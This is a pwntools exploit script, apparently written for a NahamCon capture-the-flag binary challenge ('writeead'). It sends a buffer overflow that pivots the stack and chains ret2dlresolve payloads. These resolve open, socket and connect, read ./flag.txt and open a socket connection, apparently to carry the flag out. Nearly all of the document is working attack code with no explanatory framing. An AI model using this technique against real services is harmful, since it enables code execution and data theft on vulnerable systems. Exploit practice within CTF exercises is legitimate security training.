#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 30824 ./writeead
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./writeead')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 30824)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak *0x{exe.entry:x}
b *0x804928c
b *0x80492ef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8045000)
# RUNPATH:  'libc.so.6:./libc-2.31.so'

io = start()
rop = ROP(exe)
dlresolve1 = Ret2dlresolvePayload(exe, "open", ["./flag.txt", 0])
dlresolve2 = Ret2dlresolvePayload(exe, "socket", [2, 1, 0]) # socket(AF_INET, SOCK_STREAM, 0)
dlresolve3 = Ret2dlresolvePayload(exe, "connect", [2, util.net.sockaddr("localhost",4141)[0], 16]) 
rop.read(0, dlresolve1.data_addr, len(dlresolve1.payload))
rop.ret2dlresolve(dlresolve1)
rop.read(0, dlresolve2.data_addr, len(dlresolve2.payload))
rop.ret2dlresolve(dlresolve2)
rop.read(0, dlresolve3.data_addr, len(dlresolve3.payload))
rop.ret2dlresolve(dlresolve3)
rop.read(1, exe.bss(0xc00), 0x80)
rop.write(2, exe.bss(0xc00), 0x80)

p = b"A" * (0x3ef)
p += p32(exe.bss(0xa00))
p += p32(exe.plt.read)
p += p32(0x08049156) # leave; ret
p += p32(0)
p += p32(exe.bss(0xa04))
p += p32(0x400)
io.send(p.ljust(0x44c, b"X"))
sleep(1)
io.send(rop.chain().ljust(0x400, b"A"))
io.send(dlresolve1.payload)
io.send(dlresolve2.payload)
io.send(dlresolve3.payload)


io.interactive()
